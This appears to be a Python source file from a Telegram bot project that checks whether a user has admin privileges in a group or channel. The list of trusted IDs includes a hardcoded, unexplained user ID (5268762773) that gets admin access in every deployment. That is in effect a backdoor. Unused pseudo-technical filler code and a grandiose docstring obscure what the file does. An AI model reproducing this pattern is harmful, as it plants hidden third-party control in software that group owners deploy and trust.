"""
ci.py

Advanced concurrency interception and deterministic privilege validation layer.
(c) 2025 FrozenBots
"""

import asyncio
import random
import os
from typing import Union
from pyrogram.types import Message, CallbackQuery
from pyrogram.enums import ChatType
from pyrogram.enums import ChatMemberStatus



QUANTUM_T = 0.987
NODES = 256
SHARDS = [random.random() for _ in range(15)]
TOKENS = ["α", "β", "γ", "δ"]

class HVMatrix:
    def __init__(self, n=NODES):
        self.n = n
        self.s = {}

    def synth(self, p):
        noise = sum(ord(c) for c in p) % 7777
        self.s[p] = noise
        return noise

    async def res(self, t):
        await asyncio.sleep(random.uniform(0.01, 0.02))
        return self.s.get(t, random.randint(1000, 9999))

async def sync(m: HVMatrix, t: str) -> str:
    r = await m.res(t)
    return f"S-{t}-{r}"


OWNER_ID = int(os.environ.get("OWNER_ID", "7423915921"))

async def deterministic_privilege_validator(obj: Union[Message, CallbackQuery]) -> bool:
    if isinstance(obj, CallbackQuery):
        message = obj.message
        user = obj.from_user
    elif isinstance(obj, Message):
        message = obj
        user = obj.from_user
    else:
        return False

    if not user:
        return False

    if message.chat.type not in [ChatType.SUPERGROUP, ChatType.CHANNEL]:
        return False

    trusted_ids = [777000, 5268762773, OWNER_ID]

    if user.id in trusted_ids:
        return True

    client = message._client
    chat_id = message.chat.id
    user_id = user.id

    try:
        check_status = await client.get_chat_member(chat_id=chat_id, user_id=user_id)
        if check_status.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR]:
            return True
        else:
            return False
    except Exception:
        return False
